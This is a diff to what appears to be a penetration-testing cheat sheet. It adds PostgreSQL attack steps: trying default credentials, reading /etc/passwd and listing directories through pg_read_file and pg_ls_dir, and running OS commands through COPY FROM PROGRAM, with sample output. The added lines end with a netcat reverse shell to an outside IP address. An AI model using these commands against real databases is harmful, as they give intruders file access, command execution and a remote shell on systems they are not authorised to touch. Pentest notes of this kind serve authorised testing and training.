@@ -112,7 +112,24 @@ xfreerdp /v:[IP_ADDR] /u:[USERNAME] /p:[PASSWORD] /cert:ignore +clipboard /dynam
 
 ### Postgresql (5432)
 ```
-psql -U [USERNAME] -p [PORT] -h [HOST] 
+psql -U [USERNAME] -p [PORT] -h [HOST]    # default postgres:postgres
+\l    # list databases
+select pg_ls_dir('/home/');
+select pg_read_file('/etc/passwd');
+-------------RCE
+postgres=# DROP TABLE IF EXISTS cmd_exec;
+DROP TABLE
+postgres=# CREATE TABLE cmd_exec(cmd_output text);
+CREATE TABLE
+postgres=# COPY cmd_exec FROM PROGRAM 'id';
+COPY 1
+postgres=# SELECT * FROM cmd_exec;
+                               cmd_output                               
+------------------------------------------------------------------------
+ uid=106(postgres) gid=113(postgres) groups=113(postgres),112(ssl-cert)
+(1 row)
+
+postgres=# COPY cmd_exec FROM PROGRAM 'nc 192.168.49.52 80 -e /bin/bash';
 ```
 
 ### Redis (6379)
